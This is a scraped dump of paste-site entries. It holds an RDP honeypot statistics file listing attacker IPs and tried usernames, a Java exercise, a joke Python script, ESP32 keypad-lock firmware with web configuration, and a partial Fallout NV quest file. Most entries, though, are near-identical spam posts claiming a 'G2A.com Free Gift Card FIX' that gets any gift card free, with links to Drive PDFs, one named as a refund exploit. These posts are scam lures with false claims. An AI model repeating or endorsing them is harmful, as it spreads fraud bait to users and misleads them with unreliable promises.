id,title,username,language,date,content
yhG6vxBw,2024-06-21_stats.json,rdp_snitch,JSON,Friday 21st of June 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""139.59.123.230"": 8,
    ""45.227.254.55"": 2,
    ""91.238.181.71"": 1,
    ""139.9.189.14"": 2,
    ""222.132.26.43"": 2,
    ""164.92.104.215"": 9,
    ""103.75.186.158"": 1,
    ""124.71.139.40"": 1,
    ""188.40.217.164"": 1,
    ""104.248.154.46"": 1,
    ""185.196.220.41"": 3,
    ""185.234.216.125"": 2,
    ""147.185.132.19"": 3,
    ""2.57.149.186"": 2,
    ""66.85.52.118"": 1,
    ""87.251.75.64"": 1,
    ""165.154.55.98"": 1,
    ""64.124.50.139"": 2,
    ""212.70.149.142"": 2,
    ""103.121.74.4"": 1,
    ""167.179.37.82"": 1,
    ""45.136.254.145"": 1,
    ""223.166.31.100"": 1,
    ""212.70.149.146"": 9,
    ""185.170.144.3"": 2,
    ""167.94.145.108"": 1,
    ""13.92.210.53"": 4,
    ""213.109.202.250"": 8,
    ""147.185.132.60"": 3,
    ""31.43.185.3"": 3,
    ""43.134.29.21"": 1,
    ""45.227.254.49"": 4,
    ""147.182.240.237"": 3,
    ""194.165.16.73"": 2,
    ""152.32.156.117"": 1,
    ""87.251.75.211"": 1,
    ""198.235.24.206"": 3,
    ""45.33.72.145"": 4,
    ""157.245.168.230"": 1,
    ""108.175.0.170"": 1,
    ""116.140.196.215"": 1,
    ""198.235.24.184"": 3,
    ""81.19.135.2"": 3
  },
  ""asn"": {
    ""AS14061"": 22,
    ""AS267784"": 6,
    ""AS49434"": 1,
    ""AS55990"": 3,
    ""AS4837"": 3,
    ""AS135905"": 1,
    ""AS24940"": 1,
    ""AS208046"": 3,
    ""AS57523"": 2,
    ""AS396982"": 12,
    ""AS208312"": 10,
    ""AS62537"": 1,
    ""AS208091"": 2,
    ""AS135377"": 2,
    ""AS6461"": 2,
    ""AS204428"": 11,
    ""AS134886"": 1,
    ""AS9902"": 1,
    ""AS56309"": 1,
    ""AS17621"": 1,
    ""AS197414"": 2,
    ""AS398705"": 1,
    ""AS8075"": 4,
    ""AS211736"": 3,
    ""AS132203"": 1,
    ""AS48721"": 2,
    ""AS63949"": 4,
    ""AS8560"": 1,
    ""AS209588"": 3
  },
  ""isp"": {
    ""DIGITALOCEAN"": 8,
    ""Flyservers S.A."": 11,
    ""Datacenter location PAR1 France"": 1,
    ""Huawei Cloud Service data center"": 3,
    ""CHINA UNICOM China169 Backbone"": 2,
    ""DigitalOcean, LLC"": 14,
    ""Inet software one member company limited"": 1,
    ""Hetzner Online GmbH"": 1,
    ""ColocationX Ltd."": 3,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Google LLC"": 12,
    ""Red Byte LLC"": 10,
    ""Sauce Labs Inc"": 1,
    ""Xhost Internet Solutions LP"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Zayo Bandwidth"": 2,
    ""SS-Net"": 11,
    ""Super Sonic Broadband Pvt. Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Siamdata Communication Co., ltd."": 1,
    ""China Unicom Shanghai Province Network"": 1,
    ""Censys, Inc."": 1,
    ""Microsoft Corporation"": 4,
    ""FOP Dmytro Nedilskyi"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Akamai Technologies, Inc."": 4,
    ""IONOS SE"": 1,
    ""China Unicom CHINA169 Network"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 22,
    ""UAB Host Baltic"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 1,
    ""Huawei Public Cloud Service"": 2,
    ""Wfedune EDU"": 2,
    ""Inet software one member company limited"": 1,
    ""Huawei Cloud Service"": 1,
    ""Khaled Raafat"": 1,
    ""Makut Investments"": 3,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Palo Alto Networks, Inc"": 12,
    ""Sauce Labs Inc"": 1,
    ""Xhost Internet Solutions"": 2,
    ""Ucloud Information Technology"": 1,
    ""Microsoft Corporation"": 2,
    ""4Media Ltd"": 11,
    ""Super Sonic Broadband Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""ReadyIDC Co., Ltd"": 1,
    ""Unknown"": 1,
    ""Xhostis"": 2,
    ""Censys, Inc."": 1,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""FOP Dmytro Nedilskyi"": 3,
    ""Tencent Cloud Computing"": 1,
    ""Flyservers S.A"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Linode"": 4,
    ""IONOS Inc"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Alviva Holding Limited"": 3
  },
  ""regionName"": {
    ""South West"": 8,
    ""Vilnius"": 6,
    ""\u00cele-de-France"": 1,
    ""Guangdong"": 2,
    ""Beijing"": 3,
    ""California"": 26,
    ""Hanoi"": 1,
    ""Shanghai"": 2,
    ""Bavaria"": 1,
    ""Central Singapore"": 1,
    ""Virginia"": 9,
    ""Moscow"": 10,
    ""Lesser Poland"": 2,
    ""North Holland"": 4,
    ""Ho Chi Minh"": 1,
    ""Sofia-Capital"": 11,
    ""Maharashtra"": 2,
    ""Phnom Penh"": 1,
    ""Nonthaburi"": 1,
    ""Michigan"": 1,
    ""Kyiv City"": 3,
    ""North West"": 1,
    ""Kaunas"": 2,
    ""New Jersey"": 4,
    ""Florida"": 1,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 10,
    ""Lithuania"": 8,
    ""France"": 1,
    ""China"": 7,
    ""United States"": 41,
    ""Vietnam"": 2,
    ""Germany"": 4,
    ""Russia"": 10,
    ""Poland"": 2,
    ""The Netherlands"": 4,
    ""Bulgaria"": 11,
    ""India"": 2,
    ""Cambodia"": 1,
    ""Thailand"": 1,
    ""Ukraine"": 3
  },
  ""account"": {
    ""hello"": 37,
    ""Test"": 13,
    ""Administr"": 11,
    ""Domain"": 24,
    ""kiZLAJKJR"": 1,
    ""HBObBS"": 1,
    ""MVNPcI"": 1,
    ""(empty)"": 4,
    ""qxoLuuTSM"": 1,
    ""NTTPDX"": 1,
    ""irdpRO"": 1,
    ""Administrator"": 1,
    ""HPuNgfilU"": 1,
    ""reauNw"": 1,
    ""ccAEDD"": 1,
    ""r1kj4kmo"": 4,
    ""beio"": 1,
    ""QcKlLySsX"": 1,
    ""xIgcHp"": 1,
    ""QqEWUR"": 1
  },
  ""keyboard"": {
    ""Unknown"": 107
  },
  ""client_build"": {
    ""Unknown"": 107
  },
  ""client_name"": {
    ""Unknown"": 107
  },
  ""ip_type"": {
    ""hosting"": 52,
    ""Unknown"": 44,
    ""proxy"": 11
  }
}"
6UNiW4cR,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,bgill55,JavaScript,Friday 21st of June 2024 07:12:57 PM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
June 23 2024

"
uqwyNg93,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,FreeRobux12345,JavaScript,Friday 21st of June 2024 07:06:59 PM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
J87b0PLf,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,mikyser,JavaScript,Friday 21st of June 2024 07:00:57 PM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
AnaajhBr,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Ohtaku,JavaScript,Friday 21st of June 2024 06:55:00 PM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
June 23 2024

"
WRa1USbE,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Elii,JavaScript,Friday 21st of June 2024 06:49:01 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
June 23th 2024

"
Peu6xKnp,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,jusst2k4,GetText,Friday 21st of June 2024 06:44:08 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_309214.pdf
 
Working as of:
22 June 2024"
zhUV4XvL,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,guywithabigheart,JavaScript,Friday 21st of June 2024 06:43:03 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
wzDKs1Ri,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,PetrikDev,JavaScript,Friday 21st of June 2024 06:37:05 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
N5zY7VQm,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,x3kiN,JavaScript,Friday 21st of June 2024 06:31:07 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
hzKKjPq7,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,FeasModz514,JavaScript,Friday 21st of June 2024 06:25:08 PM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
June 23th 2024

"
njX2wvQL,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,kiraezwhethe,JavaScript,Friday 21st of June 2024 06:19:10 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1Fm93vDofAelA7sgUzHybX6MkqSgjBLqc/view?16556

Working as of:
23th of June 2024

"
8UnHs2cr,heart_delivery.java,Krasipeace,Java,Friday 21st of June 2024 05:15:47 PM CDT,"import java.util.Scanner;
import java.util.Arrays;
import java.util.stream.Collectors;

public class HeartDelivery {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int[] neighborhood = Arrays.stream(scanner.nextLine().split(""@""))
                                   .mapToInt(Integer::parseInt)
                                   .toArray();
        String[] command = scanner.nextLine().split("" "");
        
        int currentHouse = 0;
        while (!command[0].equals(""Love!"")) {
            int jump = Integer.parseInt(command[1]);

            currentHouse = cupidJump(neighborhood, currentHouse, jump);

            neighborhood[currentHouse] -= 2;

            checkHouse(neighborhood, currentHouse);

            command = scanner.nextLine().split("" "");
        }
        
        System.out.println(""Cupid's last position was "" + currentHouse + ""."");
        boolean missionSuccessful = Arrays.stream(neighborhood).allMatch(house -> house <= 0);
        
        if (missionSuccessful) {
            System.out.println(""Mission was successful."");
        } else {
            long failedPlaces = Arrays.stream(neighborhood).filter(house -> house > 0).count();
            System.out.println(""Cupid has failed "" + failedPlaces + "" places."");
        }
    }

    private static void checkHouse(int[] neighborhood, int currentHouse) {
        if (neighborhood[currentHouse] == 0) {
            System.out.println(""Place "" + currentHouse + "" has Valentine's day."");
        }
        if (neighborhood[currentHouse] < 0) {
            System.out.println(""Place "" + currentHouse + "" already had Valentine's day."");
        }
    }

    private static int cupidJump(int[] neighborhood, int currentHouse, int jump) {
        if (currentHouse + jump >= neighborhood.length) {
            currentHouse = 0;
        } else {
            currentHouse += jump;
        }
        
        return currentHouse;
    }
}
"
TbXancg4,Untitled,3th1ca14aX0r,Python,Friday 21st of June 2024 04:32:18 PM CDT,"class KravMaga:
    def __init__(self, practitioner_name):
        self.practitioner_name = practitioner_name

    def perform_move(self, move):
        return f""{self.practitioner_name} performs a {move} with the finesse of a ninja and the intensity of a coffee-fueled coder!""

def krav_maga_joke():
    practitioner = KravMaga(""Joseph Jewell"")
    moves = [""punch"", ""kick"", ""block"", ""escape maneuver""]

    joke = f""Why did the programmer start learning Krav Maga?\n""
    joke += f""Because {practitioner.practitioner_name} wanted to master both code and combat!\n""

    for move in moves:
        joke += practitioner.perform_move(move) + ""\n""

    joke += ""Remember: In coding and in Krav Maga, always expect the unexpected errors and opponents!""
    return joke

if __name__ == ""__main__"":
    print(krav_maga_joke())"
xk2jra9X,Lilygo T-Display (ESP32) Keypad + relay lock (webserver),jgoy,C++,Friday 21st of June 2024 03:45:16 PM CDT,"/* Materiaal:
=============
Smallere versie van ESP32 met display:
https://www.lilygo.cc/products/lilygo%C2%AE-ttgo-t-display-1-14-inch-lcd-esp32-control-board?variant=42720264650933
https://www.amazon.nl/dp/B0CTG459MW     (uitbreidingsbord)
https://www.amazon.nl/dp/B07RCGWGD2     (numeriek keypad)
https://www.amazon.nl/dp/B06W564ZSD     (PCF8574: 8 bit parallel naar I2C)
https://www.amazon.nl/dp/B07PZC9ZMM     (relais met octocoupler - triggerstroom 5 mA)

Aansluitingen: 
==============
Numeriek keypad -> PCF8574, vanaf P0 .. P6 (P0 .. P7 indien keypad met 4 kolommen)
PCF8574 -> ESP32: GND -> GND, VCC -> 3V3, SDA -> 21, SCL -> 22 (normale I2C-aansluitingen)
Relais -> ESP32: IN -> 26, DC+ -> V5, DC- -> GND  */

#include <WiFi.h>
#include <WebServer.h>    // arduino IDE - keuze bord: DOIT ESP32 DEVKIT V1
#include <Preferences.h>  // https://github.com/vshymanskyy/Preferences
#include <I2CKeyPad.h>    // https://github.com/RobTillaart/I2CKeyPad
#include <TFT_eSPI.h>     // https://github.com/Bodmer/TFT_eSPI
#include <Wire.h>

Preferences flash;                       // om gegevens weg te schrijven en op te halen uit FLASH-geheugen
WebServer mijnServer(80);                // instantie van Webserver
I2CKeyPad keyPad(0x20);                  // 0x20 = de 3 brugjes staan het verst van de parallelcontacten
TFT_eSPI tft = TFT_eSPI();               // User_Setup: Setup25_TTGO_T_Display.h
TFT_eSprite sprite = TFT_eSprite(&tft);  // sprites voor vloeiende bewegingen op het display: hoofdsprite
TFT_eSprite leftSp = TFT_eSprite(&tft);  // sprite linkerkant scherm
TFT_eSprite rightS = TFT_eSprite(&tft);  // sprite rechterkant scherm

const uint8_t relaisPin = 26;    // relais stuurt het slot
bool slot_open = false, code_veranderd = false, toetsen_actief = true, isCodeJuist = false;
uint32_t slotMillis, codeMillis, keypadMillis;                      // voor de timers
String codes[20];                                                   // lege array van 20 strings om de codes in te laden
String paswoord;                                                    // ""paswoord"" dat vergeleken wordt met de codes
const char *netwerkNaam = ""MySSID"", *hetPaswoord = ""MypassWord"";    // voor access point
const char *volgNr[] = { ""code00"", ""code01"", ""code02"", ""code03"", ""code04"", ""code05"", ""code06"", ""code07"", ""code08"", ""code09"",
                         ""code10"", ""code11"", ""code12"", ""code13"", ""code14"", ""code15"", ""code16"", ""code17"", ""code18"", ""code19"" };

void setup() {
  Serial.begin(115200);
  tft.init(), tft.setRotation(3);        // initialiseren display + landscape
  sprite.createSprite(240, 135);         // sprite voor snellere weergave op scherm
  digitalWrite(TFT_BL, LOW);             // display uitzetten: backlight off
  pinMode(relaisPin, OUTPUT), digitalWrite(relaisPin, LOW);
  pinMode(35, INPUT_PULLUP);            //  knop naast usb = om rotatie scherm te wijzigen
  Wire.begin(), Wire.setClock(800000);  //  bepaalt de snelheid dat het keypad gelezen wordt. Was 400000 voor een ESP8266
  keyPad.begin();
  startWiFiHotSpot();
  startWebServer();
}

void loop() {
  keyPadAfhandelen();         // toetsaanslagen verwerken
  mijnServer.handleClient();  // webserver behandelt aanvragen van verbonden apparaten
}

void startWiFiHotSpot() {  // start hotspot
  IPAddress local_IP(1, 2, 3, 4), gateway(1, 2, 3, 4), subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_IP, gateway, subnet);           // stelt ""1.2.3.4"" in als adres in browser voor webserver
  WiFi.softAP(netwerkNaam, hetPaswoord, 1, 0, 8, false);  // netw, pasw, kanaal, verborgen, ...
}

void startWebServer() {                      // webserver & navigatie pagina's
  codesOphalen();                            // slotcodes uit flash-geheugen naar variabelen kopi√´ren
  mijnServer.on(""/"", paginaCodesInstellen);  // functies voorzien voor elke pagina-link
  mijnServer.on(""/codesOpgeslagen/"", paginaCodesOpslaan);
  mijnServer.onNotFound(paginaNietGevonden);
  mijnServer.begin();
}

void keyPadAfhandelen() {                               // behandelt ingetikte cijfers en kijkt na of de code correct is
  const char keys[] = ""123A456B789C*0#DNF"";             // toetsen van klavier. N = NoKey, F = Fail
  uint8_t index = keyPad.getKey();                      // input van toetsenbord opvragen
  if (index != 16) {                                    // indien er een toets ingedrukt werd (geen ""N"" en dus geen index 16)
    if (toetsen_actief) {                               // toetsaanslagen worden alleen aanvaard na loslaten eerdere toets
      if (millis() - keypadMillis > 200) {              // 200 milliSec UI debouncing
        toetsen_actief = false;                         // toetsenbord blokkeren als een toets ingetikt werd
        codeMillis = millis();                          // gebruiker heeft max. 10 seconden per cijfer
        if (index == 12 || index == 14) paswoord = """";  // resetten code bij intikken ""*"" of ""#""
        else paswoord += keys[index];                   // ingetikt cijfer bijvoegen
        Serial.print(keys[index]);                      // debug info
        digitalWrite(TFT_BL, HIGH);                     // display aanzetten (backlight aan)
        sprite.fillSprite(TFT_BLACK);                   // vorige gegevens op display wissen
        for (uint8_t i = 0; i < paswoord.length(); i++) sprite.fillCircle(30 + i * 33, 68, 15, TFT_YELLOW);
        sprite.pushSprite(0, 0);  // sprite naar display wegschrijven op coordinaten 0, 0
        checkCode(paswoord);      // kijk of code correct is
        keypadMillis = millis();  // ""10 seconden-vlag"" zetten dat er een toets ingedrukt werd
      }
    }
  } else if (index == 16) toetsen_actief = true;                  // bij loslaten van toets (index 16), toetsenbord vrijgeven.
  if (paswoord.length() >= 6) paswoord = """", Serial.println();    // paswoord reset als er te veel werd ingetikt
  if (!timer_Intikken(10000, codeMillis)) paswoord = """";          // na 10 seconden niets intikken: paswoord reset
  if (millis() - keypadMillis > 5000) digitalWrite(TFT_BL, LOW);  // 5 seconden na intikken: display uitzetten
  if (slot_open) digitalWrite(relaisPin, (timer_Slot_Open(5000, slotMillis)) ? HIGH : LOW);
  if (isCodeJuist) animatieDisplay(""Slot Open"");
}

void paginaCodesInstellen() {  // startpagina van webserver
  mijnServer.send(200, ""text/html"", basisHtml() + instelHtml());
}

void paginaCodesOpslaan() {                                      // knop ""Opslaan"" van webpagina stuurt naar deze functie
  flash.begin(""codes"", true);                                    // true = alleen lezen
  for (byte i = 0; i < 20; i++) {                                // we lezen 20 waarden uit
    String idx = ""a"";                                            // nakijken of er iets gewijzigd werd
    idx = idx + i;                                               // ""a0""..""a19""
    if (codes[i] != mijnServer.arg(idx)) code_veranderd = true;  // vlag zetten als er wijzigingen waren
    codes[i] = mijnServer.arg(idx);
  }
  flash.end();
  mijnServer.send(200, ""text/html"", basisHtml() + ((code_veranderd) ? opgeslagenHtml() : geenWijzigingHtml()));
  if (code_veranderd) opslaan(), code_veranderd = false;  // indien wijzigingen: opslaan en reset de vlag
}

void opslaan() {                 // enkel aangeroepen als er wijzigingen zijn aan een veld op de pagina
  flash.begin(""codes"", false);   // false = ook schrijven
  for (byte i = 0; i < 20; i++)  // alle 20 velden van webpagina opvragen en controleren op lengte
    if (codes[i].length() < 7 && codes[i].length() > 3) flash.putString(volgNr[i], codes[i]);
  flash.end();     // codes tussen 6 en 4 cijfers worden opgeslagen
  codesOphalen();  // nodig om de volgende keer bij startpagina de gewijzigde waarden weer te geven
}

void paginaNietGevonden() {  // error 404
  mijnServer.send(404, ""text/html"", basisHtml() + nietGevondenHtml());
}

void checkCode(String mijnCode) {  // slot openen moet via deze functie
  isCodeJuist = false;
  for (uint8_t i = 0; i < 20; i++)                 // alle 20 codes aflopen
    if (codes[i] == mijnCode) isCodeJuist = true;  // kijken of er 1 overeenkomt
  if (isCodeJuist) {                               // indien juiste code: openen en teller van 5 seconden starten
    slot_open = true, slotMillis = millis();
    Serial.println(""\nSlot open met code "" + mijnCode);
  }
}

bool timer_Slot_Open(uint16_t mijnTijd, uint32_t beginTijd) {  // timer om slot te sluiten
  if (millis() - beginTijd >= mijnTijd) slot_open = false, paswoord = """";
  return (millis() - beginTijd >= mijnTijd) ? false : true;
}

bool timer_Intikken(uint16_t mijnTijd, uint32_t beginTijd) {  // timer max tijd tussen ingetikte cijfers
  return (millis() - beginTijd >= mijnTijd) ? false : true;
}

void codesOphalen() {          // slotcodes uit flash-geheugen lezen en naar variabelen kopi√´ren
  flash.begin(""codes"", true);  // true : FLASH alleen lezen
  for (byte i = 0; i < 20; i++) codes[i] = flash.getString(volgNr[i], ""947681"");
  flash.end();
}

void splitSprite(bool split) {  // horizontaal splitsen [bool split = true] of samenvoegen [false]
  leftSp.createSprite(120, 135);
  rightS.createSprite(120, 135);
  for (byte ver = 0; ver < 135; ver++) {  // sprite in 2 delen opdelen en gegevens naar de helften schrijven
    for (byte hor = 0; hor < 120; hor++) leftSp.drawPixel(hor, ver, sprite.readPixel(hor, ver));
    for (byte hor = 120; hor < 240; hor++) rightS.drawPixel(hor - 120, ver, sprite.readPixel(hor, ver));
  }
  if (split) leftSp.drawFastVLine(119, 0, 135, TFT_BLACK), rightS.drawFastVLine(0, 0, 135, TFT_BLACK);
  for (byte hor = 0; hor < 120; hor++) {
    if (split) leftSp.pushSprite(0 - hor, 0), rightS.pushSprite(hor + 120, 0);
    else leftSp.pushSprite(hor - 120, 0), rightS.pushSprite(240 - hor, 0);
  }
  leftSp.deleteSprite(), rightS.deleteSprite();
}

void animatieDisplay(String tekst) {                                       // wordt aangeroepen bij openen slot
  digitalWrite(TFT_BL, HIGH);                                              // display aanzetten
  sprite.fillSprite(sprite.color565(100, 100, 100));                       // vul display met grijs
  for (int i = 0; i < 8192; i++) {                                         // oppervlak met fijne textuur aanmaken
    byte j = random(100) + 50;                                             // maak random grijswaarden
    sprite.drawPixel(random(240), random(135), sprite.color565(j, j, j));  // en zet op willekeurige plaatsen
  }
  sprite.setFreeFont(&FreeSansBold18pt7b);  // keuze font
  sprite.setTextColor(TFT_YELLOW);
  sprite.drawCentreString(tekst, 120, 60, 1);
  splitSprite(false);                            // scherm vanuit buitenkanten (L + R) samenvoegen
  sprite.drawFastHLine(0, 134, 240, TFT_BLACK);  // om te vermijden dat er lijnen achterblijven
  for (byte i = 0; i < 136; i++) {               // schuif alles vloeiend naar boven
    sprite.pushSprite(0, 0 - i);
  }
  digitalWrite(TFT_BL, LOW);  // display terug uitzetten
  isCodeJuist = false;
}

String basisHtml() {  // basispagina html + css
  String html0 = ""<!DOCTYPE html>\r\n<html lang='nl'>\r\n<head>\r\n"";
  html0 += ""<meta name=\""viewport\"" content = \""width=device-width\"">\r\n"";
  html0 += ""<title>Slot Boomgaard</title>\r\n<style>\r\n* {\r\n  text-align: center;\r\n"";
  html0 += ""  font-family: Arial, Helvetica, sans-serif;\r\n  }\r\n"";
  html0 += ""body{\r\n  background: linear-gradient(to right, Lavender, LightCyan);\r\n"";
  html0 += ""}\r\n\r\n.knop, input[type=submit]{\r\n  width: 110px;\r\n  color: #333333;\r\n"";
  html0 += ""  border-radius: 5px;\r\n  padding: 6px 6px;\r\n  margin: 2px; \r\n  font-family: Arial, Helvetica, "";
  html0 += ""sans-serif;\r\n  font-size: 19px;\r\n  font-weight: 500;\r\n  font-style: normal;\r\n"";
  html0 += ""  text-decoration: none; \r\n  text-align: center;\r\n"";
  html0 += ""  text-shadow: -1px -1px rgba(0,0,0,1), 1px 1px rgba(255,255,255,1); \r\n"";
  html0 += ""  background: transparent;\r\n  display: inline-block;\r\n"";
  html0 += ""  box-shadow: inset    0 1px 1px rgba(255,255,255,1), \r\n  inset  1px 0px 1px rgba(255,255,255,1),\r\n"";
  html0 += ""	inset -2px 0px 2px rgba(0,0,0,0.4),  \r\n	inset 0px -1px 1px rgba(0,0,0,0.7),   \r\n"";
  html0 += ""	0px 2px 2px rgba(0,0,0,0.7),  \r\n  1px 0px 1px rgba(0,0,0,0.7);  \r\n"";
  html0 += ""  border: 1px solid black;\r\n  background: -webkit-linear-gradient( \r\n"";
  html0 += ""    #e0e0e0 1% , #f2f2f2 3% , #fafafa 5% , #dfdfdf 10%, #ffffff 16%, \r\n"";
  html0 += ""	#cfcfcf 30%, #b9b9b9 50%, #8c8c8c 87%, #6e6e6e 96%, #4b4b4b 98%, #222222 100%);	\r\n"";
  html0 += ""}\r\n\r\n.knop:active{\r\n  transform: scale(0.98);\r\n}\r\n\r\n#draai {\r\n"";
  html0 += ""  margin: auto;\r\n  padding: 20px;\r\n  background-color: LightYellow;\r\n"";
  html0 += ""  border: 1px solid black;\r\n  border-radius: 10px;\r\n  width: 280px;\r\n"";
  html0 += ""  text-align: center;\r\n  box-shadow: 0px 6px 6px rgba(0,0,0,0.7);\r\n"";
  html0 += ""  font-size: 58px;\r\n  font-weight: 900;\r\n  position: relative;\r\n}\r\n"";
  html0 += "".inputveld {\r\n  font-size: 30px;\r\n  width: 160px;\r\n}\r\n"";
  html0 += ""</style>\r\n</head>\r\n<body>\r\n<h1>Slot Boomgaard</h1>\r\n<div id='draai'>\r\n"";
  return html0;
}

String instelHtml() {  // startpagina = codes instellen
  String html1 = ""<span style='color: red'>Wijzig Codes</span>\r\n</div><br>\r\n"";
  html1 += ""<form method='get' action='codesOpgeslagen/'><p>Code moet een getal tussen 4 en 6 cijfers zijn</p>\r\n<br>\r\n"";
  for (byte i = 0; i < 20; i++) {  // waarden uit het flashgeheugen invullen in  html-inputvelden
    html1 += (i + 1);
    html1 += "". "";
    html1 += ""<input type='number' class='inputveld' name='a"";
    html1 += i;
    html1 += ""' value='"";
    html1 += codes[i];
    html1 += ""'><br><br>\r\n"";
  }
  html1 += ""<input type='submit' value='Opslaan'>"";
  html1 += ""</form><hr>""; 
  html1 += ""</body>\r\n</html>\r\n"";
  return html1;
}

String opgeslagenHtml() {  // pagina ""waarden zijn opgeslagen""
  String html2 = ""<span style='color: green'>Bewaard</span>\r\n</div><br><br><br><br>\r\n<h1><span style='color: "";
  html2 += ""green'>De waarden zijn opgeslagen.</span>\r\n</h1></body>\r\n</html>\r\n"";
  return html2;
}

String geenWijzigingHtml() {  // pagina ""geen wijzigingen""
  String html2 = ""<span style='color: green'>OK</span>\r\n</div><br><br><br><br>\r\n<h1><span style='color: "";
  html2 += ""green'>Geen wijzigingen aangebracht.</span>\r\n</h1></body>\r\n</html>\r\n"";
  return html2;
}

String nietGevondenHtml() {  // pagina ""error 404""
  String html3 = ""404 Bestaat niet\r\n</div><br><br><br><br>\r\n"";
  html3 += ""<h1><span style='color: red'>Pagina ontbreekt</rd></h1>\r\n</body>\r\n</html>\r\n"";
  return html3;
}"
LuvbkE5J,000-FalloutNV,nino_xs,JSON,Friday 21st of June 2024 03:25:22 PM CDT,"{
	""VMS01"": {
		""100"": ""Head up to the viewing platform upstairs and complete the launch sequence.""
	},
	""VMS02"": {
		""020"": ""Track down the suspicious merchant northwest of the NCRCF and get rid of him.""
	},
	""VMS29a"": {
		""030"": ""Deliver the package to a man at the designated location on the outskirts of New Vegas, east of the Medical Clinic.""
	},	
	""VNipton"": {
		""025"": ""Rescue the Powder Ganger captives from the Legion camp east of Nipton.""
	},
	""VMS39"": {
		""020"": ""Go with Boone to Coyote Tail Ridge southwest of Bitter Springs.""
	},
	""vCCLeftMyHeart"": {
		""010"": ""Find Frank Weathers' Family. They are suspected to be at Cottonwood Cove."",
		""055"": ""(Optional) 'Free' the Weathers from slavery.""
	},
	""VMS49"": {
		""025"": ""Access Father Elijah's notes at the comm terminal west of the Gibson Scrap Yard with Veronica.""
	},
	""VHDIndependentBattle"": {
		""010"": ""Go to the Control Room in the Hoover Dam Offices and install the override chip.""
	},
	""VHDHouseBattle"": {
		""010"": ""Go to the Control Room in the Hoover Dam Offices and install the override chip.""
	},
	""vDialogueEDE"": {
		""007"": ""The Followers of the Apocalypse at the Old Mormon Fort would like to see ED-E to get access to the logs he has stored.""
	},
	""VMS54"": {
		""011"": ""Ask Doctor Henry to come to the Remnants reunion. He currently resides in Jacobstown."",
		""012"": ""Ask Daisy Whitman to come to the Remnants reunion. She currently resides in Novac."",
		""013"": ""Ask Cannibal Johnson to come to the Remnants reunion. He currently resides in a cave south of Vault 34."",
		""014"": ""Ask Orion Moreno to come to the Remnants reunion. He currently resides in an house near the NCR Sharecropper Farms."",
